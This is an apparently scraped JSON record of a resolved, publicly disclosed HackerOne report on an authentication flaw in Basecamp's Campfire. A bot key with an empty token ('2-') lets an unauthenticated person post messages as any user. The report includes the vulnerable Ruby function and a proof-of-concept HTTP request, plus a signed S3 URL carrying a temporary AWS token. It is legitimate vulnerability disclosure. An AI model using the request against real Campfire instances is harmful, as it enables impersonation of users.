@@ -1,0 +1,209 @@
+{
+  "id": 3329310,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzI5MzEw",
+  "url": "https://hackerone.com/reports/3329310",
+  "title": "Improper bot-authentication allows to impersonate any user when sending messages in a room",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2025-09-06T15:24:37.871Z",
+  "submitted_at": "2025-09-06T15:24:38.403Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "stackered",
+    "url": "/stackered",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/vw8uf97yenmngw3n4n0pjtjla2ov/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 67,
+    "url": "https://hackerone.com/basecamp",
+    "handle": "basecamp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/STtZ2opgRsHdKby72xs56KhB/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Basecamp",
+      "twitter_handle": "basecamp",
+      "website": "https://37signals.com/policies/security/response",
+      "about": "Basecamp is the leading online project manager and the birthplace of Ruby on Rails. Creators of the HEY email service."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2025-11-21T19:39:42.331Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-11-21T11:35:32.856Z",
+  "team_member_agreed_on_going_public_at": "2025-11-21T19:39:41.759Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Bots are allowed to send messages in rooms but require a bot key to authenticate.\nThe bot key authentication function is as follows:\n\n```ruby\ndef authenticate_bot(bot_key)\n  bot_id, bot_token = bot_key.split(\"-\")\n  active.find_by(id: bot_id, bot_token: bot_token)\nend\n```\n\nThe issue is that if `bot_key` has no right-hand side (ex: `1-`), `bot_token` will be `nil`, and the query will match a `User` record if `bot_id` matches a valid ID.\n\nIDs are incremental, as can be seen in the rails console, so they can be guessed easily. They are also visible in some URLs.\n\n```\ncampfire(prod):038> User.active\n=> \n[#<User:0x00007a444e940f18\n  id: 1,\n  name: \"enoent\",\n  created_at: \"2025-09-06 11:59:41.505220000 +0000\",\n  updated_at: \"2025-09-06 14:08:08.788258000 +0000\",\n  role: \"administrator\",\n  email_address: \"[FILTERED]\",\n  password_digest: \"[FILTERED]\",\n  active: true,\n  bio: \"<s>ddqsdqsds</s>\",\n  bot_token: nil>,\n #<User:0x00007a444e940dd8\n  id: 2,\n  name: \"test\",\n  created_at: \"2025-09-06 13:24:29.113250000 +0000\",\n  updated_at: \"2025-09-06 13:42:26.539909000 +0000\",\n  role: \"member\",\n  email_address: \"[FILTERED]\",\n  password_digest: \"[FILTERED]\",\n  active: true,\n  bio: nil,\n  bot_token: nil>,\n #<User:0x00007a444e940c98\n```\n\nThe following request highlights the issue, as it allows an unauthenticated user to impersonate another user (here with ID `2`) and post messages on their behalf:\n\n```\nPOST /rooms/2/2-/messages HTTP/1.1\nHost: localhost:8000\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0\nAccept: text/vnd.turbo-stream.html, text/html, application/xhtml+xml\nContent-Type: application/x-www-form-urlencoded;charset=UTF-8\nContent-Length: 193\n\nHello ! I'm the test user, even though I'm not authenticated\n```\n\nThe attached image shows that the message was successfully posted and appears to come from the \"test\" user.\n\n## Impact\n\nAn unauthenticated user can send arbitrary messages as any user, in rooms the impersonated user have access to.",
+  "bounty_amount": "2000.0",
+  "formatted_bounty": "$2,000",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 4756254,
+      "file_name": "message_posted.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dhgnnb2dlbrqzybkh1vspljeq1qn?response-content-disposition=attachment%3B%20filename%3D%22message_posted.png%22%3B%20filename%2A%3DUTF-8%27%27message_posted.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQY6WM27R6%2F20260703%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260703T042538Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDwaCXVzLXdlc3QtMiJIMEYCIQCw73CRLz9sOJGZ68jR3COYrzYL3ILrCiO4Ldt1wAcDSgIhAME5n1ZBPtjrek4miyWIdOchrHmJn%2BJjRw%2FOjwY99XgHKrIFCAUQAxoMMDEzNjE5Mjc0ODQ5IgxARN2DuvvpJZ2epWMqjwUO%2Bkmg9tr%2B6wqfKD9br9ucHuRS%2FIehwltTZbySAR4NCOkdmA78DoU30sj8NIUMUa4CB6825u5HJmurPDFwVxnBUd%2FsqMUlEUvRW08%2BZI3jmcKdmDbzytaJbrWWm8flrJKvR6y3ivBYg6iAwCY8k4PvhC4dahTn%2BtJNtGlkb92du%2B6nvxeQQ%2FrsMKj6EFZG2xulxGiqMzyN2crdMwj1hhFWon5yXIuTCk6njfG9N7tOknAYV%2F23NCvOD0zoSQ7hhDvO8V%2Fxy%2BHlqGZZJjkkEFaNxjeIzb3R%2BZ8aivYnj2MMbsGPeKuCHInB5jYzz2DhntusW2IIaBFwTroHLdPBXY%2BhH%2FPKq%2B7%2BPpW0j4LBlU5avT0rmYVlYVhIzfpGeWhRxMFLNgzm%2FMLDKv9gr0FloMqRAXfMoyNh0ZlKxdA4t40HBhXlOEfe4sQnTBUT7gEEu5GUme0ftpyct%2B2OfJXvmBuFHS%2FVtfrga6jKQYLDHTHkIwk2ZR15fOiuFtIqrblokJAu8kDg4favAijvluHqLz0vF3D4c33wNCp1T8FR6WM1LPOBG%2BdXtdF%2F0A09eL5aJNVeMFdd2nqamMf%2BORN0P6ncuN81ci9MrqabMg0RIGvhVCApDAGCTo3M9%2FJNUEZyQz%2B5TdLEfQaAX88TuASCjK3XqWvv5stZEUiI6as6ESxd2njeBTZQ2kWT5ljlS7zVazo5KI8vv4uHr%2BJd29b44vQdKU19Vl3lDuqtqh8wOo1ePMit%2BfXK9PL7Z79AJ%2FZxQlOD13z5olJ1ol7DZlJ5k3sADywbDfF0avYaZ1YfXUCi6tdTFbkmrTdlHegp0lfWcpOIvRI70B7XGspFQ6MgyAWEDlDQ8OTou%2Byb7dG73qqHMOzmnNIGOrABdjkpiCK7pXbgfyOEI8FdTrlOpemp4A%2BMTNlSvyRUUyY8CP6QWi7kn7GTiQqPPWV%2B6ick6o2sA1gGTX9Mt5bgwVsA0MjvFDLmSjcnZ6OJCLIHDycmE7Hi887Wj0q2aCdCkdjRqTUlo0icaleJQWwkMdcyvF%2F%2BrAAIBhAjwfGsQ1cpU%2FXcYFGq5p4iD65F6C90YZ7mDEYnAYavdpPSy9vFBoHLbkCRBTQELtbhQgATo2A%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c8f85dec8d2f7397905c82b9f088a8b9507a7b3382267a4eac9feb008d5423a7",
+      "file_size": 48951,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2025-12-21T11:35:33.021Z",
+  "allow_singular_disclosure_after": -16735805.608264435,
+  "singular_disclosure_allowed": true,
+  "vote_count": 126,
+  "voters": [
+    "ell0guvn0r",
+    "orange303",
+    "k0ns0l",
+    "n1m0",
+    "ganeshbagaria",
+    "drsniper",
+    "zy9ard3",
+    "yoyomiski",
+    "dukrov",
+    "mohaned0101",
+    "and 116 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 604232,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "ONCE: Campfire",
+    "max_severity": "high"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "3329310",
+  "votes": 126,
+  "latest_disclosable_activity_at": "2025-11-21T19:39:42.699Z",
+  "_metadata": {
+    "saved_at": "2026-07-03T12:25:38.879988",
+    "source": "https://hackerone.com/reports/3329310.json",
+    "report_id": 3329310
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzI5MzEw",
+    "databaseId": "3329310",
+    "title": "Improper bot-authentication allows to impersonate any user when sending messages in a room",
+    "url": "https://hackerone.com/reports/3329310",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2025-11-21T19:39:42.331Z",
+    "created_at": "2025-09-06T15:24:37.871Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzI3",
+      "name": "Improper Authentication - Generic",
+      "external_id": "cwe-287"
+    },
+    "severity": {
+      "rating": "high",
+      "score": null
+    },
+    "reporter": {
+      "username": "stackered"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzY3",
+      "handle": "basecamp",
+      "name": "Basecamp",
+      "url": "https://hackerone.com/basecamp",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS83MjUwMzU=",
+            "amount": "2000.00",
+            "awarded_amount": "2000.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2025-09-10T08:43:18.939Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzMzMjkzMTA=",
+    "_id": "3329310",
+    "disclosed": true,
+    "votes": 126,
+    "latest_disclosable_activity_at": "2025-11-21T19:39:42.699Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzI5MzEw",
+      "databaseId": "3329310",
+      "title": "Improper bot-authentication allows to impersonate any user when sending messages in a room",
+      "url": "https://hackerone.com/reports/3329310",
+      "disclosed_at": "2025-11-21T19:39:42.331Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzY3",
+      "handle": "basecamp",
+      "name": "Basecamp",
+      "url": "https://hackerone.com/basecamp",
+      "currency": "usd"
+    }
+  }
+}
